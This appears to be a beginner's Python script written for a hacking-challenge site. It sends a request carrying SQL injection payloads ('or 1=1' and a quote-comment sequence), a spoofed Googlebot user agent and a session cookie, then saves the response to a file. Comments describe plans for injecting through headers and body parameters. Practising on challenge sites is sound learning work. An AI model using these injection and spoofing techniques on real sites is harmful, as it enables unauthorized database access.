import urllib #This allows us to make url request with python
import urllib.request
from urllib.request import urlopen #This allow sus to open url request data and parse through it

"""
    * The injection is only working with the url link to the code
    * We also need to figure out how to launch the main injections via the HTTP headers that we are sending over, as well as the inbody paramaters that can be extracted from the main request
"""

#THis is going to be our mian url target we forward through our gateway router 
urltrgt = "https://canyouhack.us/c/9451c5e5ec888eca491223d8f6f2cd02?key=2780d36d4e0e17581ac5ddbb0036ef39or+1%3d1"

#This is going to be the main series of headers we also froward to the http server on the backend
headers = {}

#This is where we utilize a lot of HTTP Header paramater tampering  for the main requests
headers ["GET"] = "/c/9451c5e5ec888eca491223d8f6f2cd02?key=2780d36d4e0e17581ac5ddbb0036ef39'-- HTTP/1.1"#Defines the main request type, as well as the http protocol version, and directory we ae trying to access on the web application
headers ["HOST"] = "canyouhack.us" #Defines the host, as well as the port we are connecting to (This is also where we can defiendirect IP connections)
headers ["User-Agent"] = "Googlebot" #This is going to define the user agent that identifies our web browser agent at play (Crucial for certain blocked agents in a robots txt file on the back end web server application)

print(headers)

#This is going to be the main cookie header that we use to intercept for our injection to the donaim canyouhack.us Without this the injection tecunique will get blocked
headers  ["Cookie"] = "progress=vTIPCHJXzz4vUZ5thGQNnR6/m0LGvVHD7EVpaFs0aUrlnDKhoKfxf2SEUzKOTuLtoob5B8pvtlPOP65y711b1KoA6laglDOhDaF7lBBCpWY="
#Next we need to make the URL request to the web application
urlrequest = urllib.request.Request(urltrgt, headers=headers) 

#Next we need open the main results of the query
urldata= urllib.request.urlopen(urlrequest)
urldataformated = urldata.read()

#Next we need to format how the data is going to be presented to us once it's returned
#We are going to output the data to a main file and then have it outputted to the screen in front of us
urlfile = open("URLDATA.txt", 'w')
urlfile.write(str(urldataformated)) 
urlfile.close()

print(urldataformated)
#Next after viewing the data the code needs to give us the option to also target a paramater if we find one and forward a request that will execute an SQL injection from the server side back end



